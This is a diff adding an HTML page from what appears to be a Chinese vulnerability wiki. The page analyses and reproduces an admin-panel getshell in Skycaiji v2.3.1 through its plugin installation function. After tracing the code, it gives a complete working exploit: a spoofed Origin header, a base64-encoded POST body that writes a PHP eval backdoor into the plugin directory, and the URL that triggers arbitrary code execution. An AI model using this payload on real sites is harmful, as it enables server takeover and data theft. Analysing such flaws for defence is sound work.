@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8%20v2.3.1%20%E5%90%8E%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>蓝天采集器 v2.3.1 后台getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u84dd\u5929\u91c7\u96c6\u5668 v2.3.1 \u540e\u53f0getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fagent_setstat%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fagent_setstat%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%93%9D%E5%87%8Coa/%E8%93%9D%E5%87%8COAsysUiComponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%93%9D%E5%87%8Coa/%E8%93%9D%E5%87%8COAsysUiComponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        蓝凌OAsysUiComponent 文件存在任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="v231-getshell">蓝天采集器 v2.3.1 后台getshell<a class="headerlink" href="#v231-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>蓝天采集器 v2.3.1</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞出发点位于/SkycaijiApp/admin/controller/Store.php文件中的installPluginAction函数，如图</p>
+<p><img alt="1.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId25.png" /></p>
+<p>首先代码会执行$this-&gt;_checkOrigin();函数，我们跟进一下</p>
+<p><img alt="2.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId26.png" /></p>
+<p>该函数是用来判断请求的来源是否在白名单中，注意到这里获取请求来源使用了$_SERVER[\'HTTP_ORIGIN\']</p>
+<p>这里我们只要在请求时加上一个Origin请求头，并将其值改为白名单中的值就可以了，我们看一下白名单的值</p>
+<p><img alt="3.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId27.png" /></p>
+<p>回到
+installPluginAction函数，接下来函数将传入的plugin参数先进行base64解密在进行json解码，接着调用_installPlugin函数，跟进该函数，如图</p>
+<p><img alt="4.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId28.png" /></p>
+<p>这里函数先进行了一系列数据判空操作，接着下来如果满足$plugin[\'type\']==\'release\'这个条件将会调用addCms函数，我们继续跟进addCms函数，函数位于文件/SkycaijiApp/admin/model/ReleaseApp.php
+中，如图</p>
+<p><img alt="5.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId29.png" /></p>
+<p><img alt="6.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId30.png" /></p>
+<p>首先函数会判断$cms[\'app\']是否为空，这里无需理会，在利用时只要构造一下就好，接着代码做了三个正则校验，第一个正则来判断$cms[\'app\']是否符合其命名规范，我们可以使其值为AaAaAa来绕过校验，第二个正则用来判断函数传入的$code是否存在命名空间，这里我们可以参考一下位于/plugin/release/cms/BaseCms.php文件中的写法，如图</p>
+<p><img alt="7.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId31.png" /></p>
+<p>接着是第三个正则，该处是为了判断类名是否存在，要注意的是类名需要与我们设置的$cms[\'app\']一样，这里我们可以这么写</p>
+<p>class AaAaAa{</p>
+<p>过了三个正则后我们会来到write_dir_file函数，跟进一下该函数，如图</p>
+<p><img alt="8.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId32.png" /></p>
+<p>该函数用来写文件，那么到目前为止我们就可以在网站中写入一个php文件，但是该文件要存在规定好的命名空间和类，为了写入我们可以利用的一句话，我们可以利用注释符将命名空间和类注视掉，如图</p>
+<p><img alt="9.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId33.png" /></p>
+<p>接下来就可以构造符合条件得exp了</p>
+<p>首先将代码base64编码，然后依据上述分析代码中的条件构造符合的json格式的字符串</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s">&quot;app&quot;</span><span class="p">:</span><span class="s">&quot;AaAaAa&quot;</span><span class="p">,</span><span class="s">&quot;name&quot;</span><span class="p">:</span><span class="s">&quot;test1&quot;</span><span class="p">,</span><span class="s">&quot;type&quot;</span><span class="p">:</span><span class="s">&quot;release&quot;</span><span class="p">,</span><span class="s">&quot;module&quot;</span><span class="p">:</span><span class="s">&quot;test2&quot;</span><span class="p">,</span><span class="s">&quot;code&quot;</span><span class="p">:</span><span class="s">&quot;PD9waHAKLyoKbmFtZXNwYWNlIHBsdWdpblxyZWxlYXNlXGNtczsKCmNsYXNzIEFhQWFBYXsKCXB1YmxpYyAkcmVsZWFzZTsKfSovCkBldmFsKCRfR0VUW2FdKTsKPz4=&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<p>接着把改串json字符串base64编码一下就可以post过去进行利用了。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>漏洞点位于后台安装插件功能处，首先登陆后台</p>
+<p>1.访问</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org/index.php?s=/Admin/Store/installPlugin
+</code></pre></div>
+
+<p>2.添加http头Origin:</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org
+</code></pre></div>
+
+<p>3.post输入</p>
+<div class="codehilite"><pre><span></span><code>plugin=eyJhcHAiOiJBYUFhQWEiLCJuYW1lIjoidGVzdDEiLCJ0eXBlIjoicmVsZWFzZSIsIm1vZHVsZSI6InRlc3QyIiwiY29kZSI6IlBEOXdhSEFLTHlvS2JtRnRaWE53WVdObElIQnNkV2RwYmx4eVpXeGxZWE5sWEdOdGN6c0tDbU5zWVhOeklFRmhRV0ZCWVhzS0NYQjFZbXhwWXlBa2NtVnNaV0Z6WlRzS2ZTb3ZDa0JsZG1Gc0tDUmZSMFZVVzJGZEtUc0tQejQ9In0=
+</code></pre></div>
+
+<p>如图</p>
+<p><img alt="10.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId35.png" /></p>
+<p>接着会在\plugin\release\cms\下生成AaAaAa.php的一句话后门，如图</p>
+<p><img alt="11.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId36.png" /></p>
+<p>然后在后台点击发布插件选项卡，接着点击开发按钮，如图</p>
+<p><img alt="12.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId37.png" /></p>
+<p>这时会引用我们带有一句话木马的文件，在url上添加a参数即可执行任意php代码，进而getshell，以执行phpinfo为例，访问</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">http</span><span class="o">://</span><span class="nt">www</span><span class="p">.</span><span class="nc">0-sec</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">php</span><span class="o">?</span><span class="nt">s</span><span class="o">=/</span><span class="nt">admin</span><span class="o">/</span><span class="nt">Develop</span><span class="o">/</span><span class="nt">releaseCms</span><span class="o">&amp;</span><span class="nt">app</span><span class="o">=</span><span class="nt">AaAaAa</span><span class="o">&amp;</span><span class="nt">a</span><span class="o">=</span><span class="nt">phpinfo</span><span class="o">();</span>
+</code></pre></div>
+
+<p>如图</p>
+<p><img alt="13.png" src="../resource/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8v2.3.1%E5%90%8E%E5%8F%B0getshell/media/rId38.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7873">https://xz.aliyun.com/t/7873</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fagent_setstat%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fagent_setstat%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%93%9D%E5%87%8Coa/%E8%93%9D%E5%87%8COAsysUiComponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%93%9D%E5%87%8Coa/%E8%93%9D%E5%87%8COAsysUiComponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        蓝凌OAsysUiComponent 文件存在任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
